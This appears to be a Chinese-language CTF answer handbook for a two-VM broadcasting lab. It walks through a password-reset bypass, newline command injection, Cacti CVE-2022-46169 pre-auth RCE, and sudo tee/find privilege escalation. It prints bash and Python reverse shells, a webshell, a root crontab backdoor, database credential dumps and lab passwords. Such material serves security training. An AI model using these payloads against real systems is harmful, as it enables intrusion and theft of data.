# 场景B — 广电行业 CTF 攻击链完整手册

## 一、场景架构

```
┌─────────────────────────────────────────────────────┐
│                    外部选手 (br0)                      │
│                   DHCP 获取 IP                         │
└──────────────┬──────────────────┬───────────────────┘
               │                  │
        HTTP :80 (DMZ)     HTTP :80 (DMZ)
               ▼                  ▼
┌──────────────────────┐  ┌──────────────────────────┐
│   VM-B1 (DMZ)        │  │   VM-B2 (Internal)        │
│   192.168.120.10      │  │   192.168.120.20          │
│   Hostname: gdctf-11  │  │   Hostname: gdctf-12     │
│                      │  │                          │
│   php-iptv-proxy     │  │   Cacti 1.2.19            │
│   PHP 8.1 + MySQL    │  │   Apache 2.4.52           │
│   Nginx 反向代理      │  │   PHP 7.4 + MariaDB       │
│                      │  │                          │
│   提权: sudo tee      │  │   提权: sudo find          │
│   www-data → root    │  │   www-data → root         │
└──────────────────────┘  └──────────────────────────┘
```

**网络隔离**：B1（DMZ 区）仅开放 80 端口；B2（内网区）仅允许 B1 来源访问 80/10050/5432 端口，SSH 在 DMZ 侧被 iptables DROP。

---

## 二、凭据汇总

| 系统 | 位置 | 用户名 | 密码 | 用途 |
|------|------|--------|------|------|
| **Cacti Web** | B2 :80/cacti | `admin` | `admin123` | 后台登录 |
| **Cacti DB** | B2 localhost | `cacti` | `CCWLYho1iYzP` | MariaDB 连接 |
| **iptv-proxy Web** | B1 :80 | `admin` | `admin123` | 后台登录 |
| **iptv-proxy DB** | B1 localhost | `iptvadmin` | `Iptv@Proxy#2024` | MySQL 连接 |
| **OS operator** | B1 / B2 | `operator` | `0p3rat0r@GDJ` | sudo 组成员 |
| **OS gdadmin** | B1 / B2 | `gdadmin` | `Gdadmin@123` | SSH 管理员 |

---

## 三、攻击链总览

| 步骤 | 分数 | 类别 | 描述 |
|------|------|------|------|
| **B-1** | 100 | Web Admin | php-iptv-proxy 密码重置绕过（响应篡改 false→true） |
| **B-2** | 200 | Server Regular | 后台命令注入 %0a 换行绕过 → B1 www-data shell |
| **B-3** | 100 | DB Admin | B1 MySQL `iptv_proxy` 库 → `admins` 表密码哈希 |
| **B-4** | 500 | Boundary Break | 横向移动 B1→B2，发现 Cacti 监控系统 |
| **B-5** | 500 | Server Regular | Cacti CVE-2022-46169 预认证 RCE → B2 www-data shell |
| **B-6** | 100 | DB Admin | Cacti 配置 → MariaDB 凭据 → 直连数据库 |
| **B-7** | 500 | Server Root | B1 提权：sudo tee 写 crontab → root shell |
| **B-8** | 500 | Server Root | B2 提权：sudo find → root shell |
| **合计** | **2500** | | |

---

## 四、B-1：密码重置绕过 (100pts)

### 漏洞位置
- URL：`http://192.168.120.10/reset-password`
- 文件：`src/Controllers/AuthController.php`
- 方法：`forgotPassword()` → `verifySecurityAnswer()` / `handleResetPassword()`

### 漏洞原理
密码重置分两步，两步都存在"后端已执行但 JSON 响应永远返回 `false`"的逻辑缺陷：

**第一步 — 验证安全问题**（`verifySecurityAnswer()`）：
```php
// 实际已设置 session 标记
$_SESSION['security_verified'] = $username;
// 但响应永远返回 false
echo json_encode(['success' => false, 'error' => '安全问题回答错误']);
```
**绕过方式**：拦截响应，将 `"success":false` 改为 `"success":true`。

**第二步 — 重置密码**（`handleResetPassword()`）：
```php
// 实际已更新数据库密码
$stmt->execute([$hashedPassword, $username]);
// 但响应永远返回 false
echo json_encode(['success' => false, 'error' => '重置失败，请联系管理员']);
```
**绕过方式**：再次拦截响应，将 `"success":false` 改为 `"success":true`。

> ⚠️ **关键**：必须先通过第一步的响应篡改设置 `$_SESSION['security_verified']`，否则第二步不会执行密码更新。

### 攻击步骤

#### Step 1：获取安全问题

**请求包 (Yakit 原始报文)**：
```http
GET /reset-password HTTP/1.1
Host: 192.168.120.10
Accept: text/html,application/xhtml+xml
```

从响应中提取安全问题（如 "您最喜欢的水果是?"）和安全问题 ID。

#### Step 2：验证安全问题（第一次响应篡改）

**请求包**：
```http
POST /reset-password HTTP/1.1
Host: 192.168.120.10
Content-Type: application/x-www-form-urlencoded
Content-Length: 63

action=verify&username=admin&security_answer=apple
```

**服务端原始响应**：
```json
{"success": false, "error": "安全问题回答错误"}
```

**Yakit 操作**：在 HTTP 修改器中拦截响应，将 `"success":false` 改为 `"success":true`：
```json
{"success": true, "error": "安全问题回答错误"}
```

> **注意**：安全问题答案任意填写即可。只要篡改响应让前端认为验证通过，后端的 `$_SESSION['security_verified']` 就已经被设置了（无论答案对错）。

#### Step 3：重置密码（第二次响应篡改）

**请求包**：
```http
POST /reset-password HTTP/1.1
Host: 192.168.120.10
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

action=reset&username=admin&new_password=Attacker@123
```

**服务端原始响应**：
```json
{"success": false, "error": "重置失败，请联系管理员"}
```

**Yakit 操作**：再次拦截并改为：
```json
{"success": true, "error": "重置失败，请联系管理员"}
```

此时数据库中的 admin 密码已更新为 `Attacker@123`。

#### Step 4：用新密码登录

**请求包**：
```http
POST /auth/login HTTP/1.1
Host: 192.168.120.10
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

username=admin&password=Attacker@123
```

**预期结果**：登录成功，302 跳转到后台首页，获得 PHPSESSID Cookie。

---

## 五、B-2：后台命令注入 (200pts)

### 漏洞位置
- URL：`http://192.168.120.10/admin/diag/execute`（需登录后访问）
- 文件：`src/Controllers/DiagController.php`
- 方法：`execute()`

### 漏洞原理
```php
// 黑名单过滤（仅5个字符）
$blacklist = ['|', ';', '&', '$', '`'];

// urlencode 后的输入先被解码
$target = urldecode($target);

// shell_exec 直接拼接
$cmd = 'ping -c 3 ' . $target . ' 2>&1';
$output = shell_exec($cmd);
```

**绕过方式**：`%0a`（换行符 `\n`）不在黑名单中，经 `urldecode()` 解码后，在 shell 中起到命令分隔符作用，执行第二条命令。

### 攻击步骤（Yakit 数据包）

#### 验证漏洞 — 执行 id

**请求包**：
```http
POST /admin/diag/execute HTTP/1.1
Host: 192.168.120.10
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<登录后获取的SESSION>
Content-Length: 27

target=127.0.0.1%0aid
```

**预期响应**：
```json
{
  "success": true,
  "output": "PING 127.0.0.1 ...\nuid=33(www-data) gid=33(www-data)..."
}
```

#### 反弹 Shell

**方式一：bash 反弹**（推荐）
```http
POST /admin/diag/execute HTTP/1.1
Host: 192.168.120.10
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<SESSION>
Content-Length: 140

target=127.0.0.1%0abash -c "bash -i >%26 /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>%261"
```

**方式二：写入 webshell**
```http
POST /admin/diag/execute HTTP/1.1
Host: 192.168.120.10
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<SESSION>
Content-Length: 76

target=127.0.0.1%0aecho "<?php system(\$_GET['c']);?>" > /tmp/shell.php
```

**方式三：Python 反弹**
```http
POST /admin/diag/execute HTTP/1.1
Host: 192.168.120.10
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=<SESSION>
Content-Length: 170

target=127.0.0.1%0apython3 -c "import os,pty,socket;s=socket.socket();s.connect(('<YOUR_IP>',<YOUR_PORT>));[os.dup2(s.fileno(),i) for i in(0,1,2)];pty.spawn('bash')"
```

---

## 六、B-3：B1 数据库凭据获取 (100pts)

### 漏洞位置
B1 本地 MySQL 数据库，获得 www-data shell 后可直接连接。

### 数据库连接信息
B1 的 php-iptv-proxy 使用 MySQL 存储所有配置和用户数据：
```bash
# 数据库配置在 /opt/iptv-proxy/config/database.php
mysql -u iptvadmin -p'Iptv@Proxy#2024' -h localhost iptv_proxy
```

### 攻击步骤

#### Step 1：在 B1 shell 中连接数据库

```bash
mysql -u iptvadmin -p'Iptv@Proxy#2024' -h localhost iptv_proxy
```

#### Step 2：导出管理员表

```sql
-- 查看所有表
SHOW TABLES;

-- 管理员账号和密码哈希
SELECT id, username, password, email, created_at FROM admins;
```

**预期输出**：
```
+----+----------+--------------------------------------------------------------+------------------+
| id | username | password                                                     | email            |
+----+----------+--------------------------------------------------------------+------------------+
|  1 | admin    | $2y$10$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  | admin@iptv.local |
+----+----------+--------------------------------------------------------------+------------------+
```

#### Step 3：查看其他敏感表

```sql
-- 频道配置（可能含 RTMP/RTSP 密钥）
SELECT * FROM channels;

-- 代理服务器配置
SELECT * FROM settings;

-- 系统日志
SELECT * FROM logs ORDER BY id DESC LIMIT 20;
```

#### 备选：不进入交互模式，一行命令直接导出

```bash
mysql -u iptvadmin -p'Iptv@Proxy#2024' -h localhost iptv_proxy -e "SELECT id, username, password, email FROM admins;" > /tmp/db_dump.txt
```

> **得分点**：读取 `admins` 表获得管理员密码哈希即为完成本题。密码为 bcrypt 哈希，不需要破解（B-1 已通过重置绕过登录）。

---

## 七、B-4：横向移动 → 发现 B2 (500pts)

### 从 B1 shell 探测内网

```bash
# 查看 B1 网络配置
ip addr
# eth1: 192.168.110.1/24 (内网网段)

# 扫描内网存活主机
for i in $(seq 1 254); do ping -c 1 -w 1 192.168.110.$i | grep "ttl="; done

# 发现 192.168.110.2
# 扫描端口
nc -zv 192.168.110.2 80
nc -zv 192.168.110.2 22
```

### 线索文件
B1 的 `/opt/ops/deploy_note.txt`：
```
内网Zabbix监控系统已部署：http://192.168.110.2/
请定期检查监控数据，确保业务正常运行。
```

### 通过 B1 建立 SOCKS 代理访问 B2

```bash
# 在 B1 上使用 chisel 或简单端口转发
# 方式：通过 B1 curl 探测 B2 Web 服务
curl -s http://192.168.110.2/ -I
# HTTP/1.1 302 Found → Location: /cacti/install/ (或直接到登录页)
```

---

## 八、B-5：Cacti CVE-2022-46169 预认证 RCE (500pts)

### 漏洞信息

| 项目 | 详情 |
|------|------|
| CVE | CVE-2022-46169 |
| 影响版本 | Cacti ≤ 1.2.22 |
| 目标版本 | Cacti 1.2.19 |
| 漏洞类型 | 认证绕过 + 命令注入 |
| 目标 URL | `http://192.168.120.20/cacti/remote_agent.php` |
| 利用前提 | `poller` 表中存在 hostname 为攻击者可控 IP 的记录 |

### 漏洞原理

**1. 认证绕过**（`remote_agent.php` 第 136-158 行）：
```php
$client_addr = get_client_addr();  // 从 X-Forwarded-For 等 Header 获取 IP
// 将客户端 IP 与 poller 表 hostname 逐一比对
if ($poller['hostname'] == $client_addr) {
    // 认证通过
}
```
`get_client_addr()` 会从以下 Header 读取 IP（优先级从高到低）：
- `X-Forwarded-For`, `X-Client-IP`, `X-Real-IP`, `X-ProxyUser-Ip`, `CF-Connecting-IP`, `True-Client-IP`, `HTTP_X_FORWARDED`, `HTTP_X_FORWARDED_FOR`, `HTTP_X_CLUSTER_CLIENT_IP`, `HTTP_FORWARDED_FOR`, `HTTP_FORWARDED`, `HTTP_CLIENT_IP`, `REMOTE_ADDR`

B2 的 poller 表中有 `hostname=127.0.0.1` 的记录，通过 `X-Forwarded-For: 127.0.0.1` 绕过认证。

> 注：原始代码中 `get_client_addr()` 函数存在 bug（内层 `break` 无法跳出外层循环，导致 `REMOTE_ADDR` 总是覆盖 XFF 的 IP），已在部署时修复为 `break 2`。

**2. 命令注入**（`remote_agent.php` 第 301/385 行）：
```php
$poller_id = get_nfilter_request_var('poller_id');  // 用户可控，无过滤
// ...
$cactiphp = proc_open(
    read_config_option('path_php_binary') . ' -q ' . 
    $config['base_path'] . '/script_server.php realtime ' . $poller_id,
    $cactides, $pipes
);
```
`$poller_id` 参数直接拼接到 `proc_open()` 命令行，导致命令注入。

### 攻击步骤（Yakit 数据包）

#### Step 1：验证认证绕过 + 命令注入

**请求包**：
```http
POST /cacti/remote_agent.php HTTP/1.1
Host: 192.168.120.20
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

action=polldata&poller_id=;whoami&host_id=1&local_data_ids[]=1
```

**预期响应**：
```json
[{"value":"U","rrd_name":"traffic_in","local_data_id":"1"}]
```

> **注意**：命令输出不会显示在 HTTP 响应中，需通过写文件或反弹 shell 确认执行。可用 `;whoami>/dev/shm/pwned.txt` 写入 `/dev/shm/`（共享内存，不受 PrivateTmp 影响）。

#### Step 2：收集信息

```http
POST /cacti/remote_agent.php HTTP/1.1
Host: 192.168.120.20
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 78

action=polldata&poller_id=;id>/dev/shm/.i&host_id=1&local_data_ids[]=1
```

```http
POST /cacti/remote_agent.php HTTP/1.1
Host: 192.168.120.20
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 89

action=polldata&poller_id=;sudo -l>/dev/shm/.s&host_id=1&local_data_ids[]=1
```

通过另一条注入读取结果：
```http
POST /cacti/remote_agent.php HTTP/1.1
Host: 192.168.120.20
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 88

action=polldata&poller_id=;cat /dev/shm/.i&host_id=1&local_data_ids[]=1
```

#### Step 3：反弹 Shell

**请求包**：
```http
POST /cacti/remote_agent.php HTTP/1.1
Host: 192.168.120.20
X-Forwarded-For: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 128

action=polldata&poller_id=;bash -c "bash -i >%26 /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>%261"&host_id=1&local_data_ids[]=1
```

> **关键参数说明**：
> - `action=polldata`：必须，触发 `poll_for_data()` 函数
> - `poller_id=;CMD`：注入点，分号前可为空
> - `host_id=1`：poller_item 的 host_id
> - `local_data_ids[]=1`：poller_item 的 local_data_id
> - `X-Forwarded-For: 127.0.0.1`：认证绕过 IP
>
> ⚠️ 注意 `>` 和 `&` 在 POST body 中需要 URL 编码（`%26`、`%3E`），否则可能被截断。

#### Step 4：从 B1 打 B2（横向移动场景）

如果从 B1 shell 发起攻击，需在 B1 上执行：
```bash
curl -X POST 'http://192.168.110.2/cacti/remote_agent.php' \
  -H 'X-Forwarded-For: 127.0.0.1' \
  -d 'action=polldata&poller_id=;bash -c "bash -i >%26 /dev/tcp/<YOUR_IP>/<PORT> 0>%261"&host_id=1&local_data_ids[]=1'
```

---

## 九、B-6：Cacti 配置 → 数据库凭据 (100pts)

获得 B2 www-data shell 后，收集数据库凭据：

### 方式一：直接读取 Cacti 配置文件

```bash
cat /usr/share/cacti/site/include/config.php
# 或
cat /etc/cacti/debian.php
```

**预期内容**：
```php
$database_username = 'cacti';
$database_password = 'CCWLYho1iYzP';
$database_host = 'localhost';
```

### 方式二：连入数据库

```bash
mysql -u cacti -p'CCWLYho1iYzP' -h localhost cacti -e "SHOW TABLES;"
```

**有价值的表**：
```bash
# Cacti 用户表
mysql -u cacti -p'CCWLYho1iYzP' -h localhost cacti -e "SELECT id, username, password, full_name FROM user_auth;"

# 配置表
mysql -u cacti -p'CCWLYho1iYzP' -h localhost cacti -e "SELECT name, value FROM settings WHERE name LIKE '%mail%' OR name LIKE '%pass%' OR name LIKE '%ldap%';"
```

---

## 十、B-7：B1 提权 — sudo tee (500pts)

### 漏洞位置
B1 上 www-data 用户的 sudo 配置：
```
www-data ALL=(root) NOPASSWD: /usr/bin/tee
```

### 提权原理
`tee` 可以以 root 权限写入任意文件。攻击者利用 `tee -a` 追加恶意内容到 `/etc/crontab`，获取 root 反弹 shell。

### 攻击步骤（在 B1 www-data shell 中）

#### Step 1：确认 sudo 配置

```bash
sudo -l
# User www-data may run the following commands on gdctf-11:
#     (root) NOPASSWD: /usr/bin/tee
```

#### Step 2：写入 root cron 反弹 shell

```bash
echo '* * * * * root bash -c "bash -i >& /dev/tcp/<YOUR_IP>/<YOUR_PORT> 0>&1"' | sudo /usr/bin/tee -a /etc/crontab
```

#### Step 3：等待反弹
cron 每分钟执行一次 (`* * * * *`)，最多等待 60 秒即可收到 root shell。

#### 备选方案 — 写 SSH key

```bash
# 本地生成密钥对
ssh-keygen -t rsa -f ./b1_root

# 在 B1 上写入公钥
echo "ssh-rsa AAAA..." | sudo /usr/bin/tee /root/.ssh/authorized_keys
```

---

## 十一、B-8：B2 提权 — sudo find (500pts)

### 漏洞位置
B2 上 www-data 用户的 sudo 配置：
```
www-data ALL=(root) NOPASSWD: /usr/bin/find
```

### 提权原理
`find` 命令的 `-exec` 参数可以执行任意命令。利用 `sudo find` 以 root 身份执行 `/bin/sh` 获取 root shell。

### 攻击步骤（在 B2 www-data shell 中）

#### Step 1：确认 sudo 配置

```bash
sudo -l
# User www-data may run the following commands on gdctf-12:
#     (root) NOPASSWD: /usr/bin/find
```

#### Step 2：提权执行

```bash
sudo find . -exec /bin/sh \; -quit
```

或获取交互式 root shell：
```bash
sudo find /tmp -exec /bin/bash -p \; -quit
```

#### Step 3：验证

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

# whoami
root
```

---

## 十二、完整攻击链 Yakit 复现流程

1. 访问 `http://192.168.120.10/reset-password`
2. 提交安全问题验证 → **Yakit 拦截 → 改 `success:false` 为 `true`**
3. 提交新密码 → **Yakit 拦截 → 改 `success:false` 为 `true`**
4. 用新密码登录 → 获取 Cookie
5. 带 Cookie 请求 `POST /admin/diag/execute` → `target=127.0.0.1%0abash -c "bash -i >%26 /dev/tcp/IP/PORT 0>%261"`
6. 获得 B1 www-data shell
7. **B1 读数据库**：`mysql -u iptvadmin -p'Iptv@Proxy#2024' iptv_proxy -e "SELECT * FROM admins;"`
8. B1 上扫描内网 → 发现 `192.168.110.2:80` (B2)
9. 从 B1 发 CVE-2022-46169 攻击 B2：
   ```
   curl -X POST http://192.168.110.2/cacti/remote_agent.php \
     -H "X-Forwarded-For: 127.0.0.1" \
     -d 'action=polldata&poller_id=;bash -c "bash -i >%26 /dev/tcp/IP/PORT 0>%261"&host_id=1&local_data_ids[]=1'
   ```
10. 获得 B2 www-data shell
11. **B2 读数据库**：`mysql -u cacti -p'CCWLYho1iYzP' -h localhost cacti -e "SELECT * FROM user_auth;"`
12. B1 提权：`echo '* * * * * root bash -c "bash -i >& /dev/tcp/IP/PORT2 0>&1"' | sudo tee -a /etc/crontab`
13. B2 提权：`sudo find . -exec /bin/sh \; -quit`

---

## 十三、附录

### A. 防火墙规则

**B1 iptables**：
```
-P INPUT DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -p tcp --dport 80 -j ACCEPT
-A INPUT -p icmp -j ACCEPT
```

**B2 iptables**：
```
-P INPUT DROP
-A INPUT -i lo -j ACCEPT
-A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
-A INPUT -s 192.168.110.1 -p tcp --dport 80 -j ACCEPT
-A INPUT -s 192.168.110.1 -p tcp --dport 10050 -j ACCEPT
-A INPUT -s 192.168.110.1 -p tcp --dport 5432 -j ACCEPT
-A INPUT -s 192.168.110.0/24 -j ACCEPT
# SSH (tcp/22) 不在白名单中，从 DMZ 侧不可达
```

### B. 关键文件路径

| 文件 | 路径 |
|------|------|
| B1 php-iptv-proxy | `/opt/iptv-proxy/` |
| B1 DB 配置 | `/opt/iptv-proxy/config/database.php` |
| B1 Nginx 配置 | `/etc/nginx/sites-enabled/iptv-proxy` |
| B1 部署提示 | `/opt/ops/deploy_note.txt` |
| B2 Cacti 根目录 | `/usr/share/cacti/site/` |
| B2 remote_agent.php | `/usr/share/cacti/site/remote_agent.php` |
| B2 get_client_addr() | `/usr/share/cacti/site/lib/functions.php` |
| B2 Cacti DB 配置 | `/etc/cacti/debian.php` |
| B2 版本文件 | `/usr/share/cacti/site/include/cacti_version` |
| B2 Apache 配置 | `/etc/apache2/sites-enabled/000-default.conf` |
| B2 sudo 配置 | `/etc/sudoers.d/zabbix` (或 `/etc/sudoers`) |

### C. Cacti 数据库表速查

```sql
-- Cacti 版本
SELECT * FROM version;  -- cacti = '1.2.19'

-- 用户
SELECT id, username, realm, enabled FROM user_auth;

-- Poller（认证绕过关键表）
SELECT id, hostname, status FROM poller;
-- id=1, hostname=gdctf-12, status=2
-- id=2, hostname=127.0.0.1, status=1  ← XFF 绕过

-- Poller Item（命令注入触发）
SELECT * FROM poller_item;
-- local_data_id=1, host_id=1, action=2 (POLLER_ACTION_SCRIPT_PHP)
```

### D. B1 MySQL 数据库表速查

```sql
-- 管理员表（B-3 得分点）
SELECT id, username, password, email, created_at FROM admins;

-- 频道配置
SELECT id, name, url, status FROM channels;

-- 系统设置
SELECT * FROM settings WHERE name LIKE '%key%' OR name LIKE '%secret%';

-- 操作日志
SELECT * FROM logs ORDER BY id DESC LIMIT 20;
```

### E. CVE-2022-46169 请求参数说明

| 参数 | 必须 | 说明 |
|------|------|------|
| `action` | ✅ | 固定值 `polldata`，触发 `poll_for_data()` |
| `poller_id` | ✅ | 命令注入点，拼接到 `proc_open()` 命令行 |
| `host_id` | ✅ | 需与 poller_item 表中 host_id 匹配 (通常为 1) |
| `local_data_ids[]` | ✅ | 需与 poller_item 表中 local_data_id 匹配 (通常为 1) |
| `X-Forwarded-For` | ✅ | HTTP Header，设为 `127.0.0.1` 绕过认证 |

### F. 常见问题排查

| 问题 | 原因 | 解决 |
|------|------|------|
| `FATAL: You are not authorized` | X-Forwarded-For 未正确设置或 get_client_addr bug | 确认 Header 格式为 `X-Forwarded-For: 127.0.0.1` |
| `Unknown Agent Request` | 缺少 `action=polldata` 参数 | 添加必需参数 |
| 命令执行无输出 | Apache PrivateTmp 隔离 | 输出写入 `/dev/shm/` 而非 `/tmp/` |
| Cacti 跳转 /install/ | 版本文件与 DB 不匹配 | 已修复，`cacti_version` 和 DB 均为 `1.2.19` |
| B1 无法直接 SSH 到 B2 | iptables DROP SSH 端口 | 通过 B1 shell 发起攻击，或从宿主机 192.168.120.254 直连 |
